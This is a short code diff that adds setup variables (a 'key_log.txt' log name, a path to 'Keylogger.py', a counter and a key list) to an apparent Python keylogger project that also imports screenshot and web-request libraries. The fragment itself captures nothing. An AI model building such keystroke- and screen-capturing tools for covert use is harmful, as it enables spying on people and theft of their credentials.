@@ -26,3 +26,11 @@ from requests import get
 
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
+
+key_information = "key_log.txt"
+
+file_path = "D:\\KeyGaurdian_project\\Keylogger.py"
+extend = "\\"
+
+count = 0
+key = []
